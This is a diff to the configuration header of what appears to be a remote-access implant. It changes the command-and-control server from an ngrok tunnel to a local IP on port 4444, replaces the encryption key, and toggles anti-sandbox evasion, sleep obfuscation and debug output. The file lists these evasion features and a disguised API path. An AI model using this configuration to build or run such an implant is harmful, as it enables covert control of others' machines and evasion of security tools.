@@ -7,9 +7,9 @@
 #define CONFIG_H
 
 // Server Configuration
-#define SERVER_HOST "109611f671d8.ngrok-free.app"
-#define SERVER_PORT 443
-#define USE_TLS 1
+#define SERVER_HOST "192.168.70.128"
+#define SERVER_PORT 4444
+#define USE_TLS 0
 
 // Client Configuration
 #define TAG "default"
@@ -22,7 +22,7 @@
 
 // Encryption Key (64 hex chars = 32 bytes)
 #define ENCRYPTION_KEY                                                         \
-  "ddc2774b87fdf3a75aa9f8d0199fbc5fac11c0f02508709d0e422380f95482a8"
+  "e780b53c1f8f50e8c8a9f188f93f6707f820f5fe39062ce0dc4f6fb6303e2adf"
 
 // Run Key (for execution validation)
 #define RUN_KEY "321"
@@ -33,13 +33,13 @@
 #define API_RESULT "/api/CpHDCPSvc"
 
 // === Evasion Settings ===
-#define ENABLE_EVASION 1      // 启用反沙箱检测 (1=启用, 0=禁用)
+#define ENABLE_EVASION 0      // 启用反沙箱检测 (1=启用, 0=禁用)
 #define EVASION_EXIT_SILENT 1 // 检测到沙箱时静默退出 (1=退出, 0=继续运行)
 #define ENABLE_DYNAPI 1       // 启用动态 API 解析 (1=启用, 0=禁用)
-#define ENABLE_SLEEP_OBF 1    // 启用睡眠混淆 (1=启用, 0=禁用)
+#define ENABLE_SLEEP_OBF 0    // 启用睡眠混淆 (1=启用, 0=禁用)
 
 // Debug mode (set to 0 to disable all console output)
-#define DEBUG_MODE 0
+#define DEBUG_MODE 1
 
 // Debug print macro
 #if DEBUG_MODE
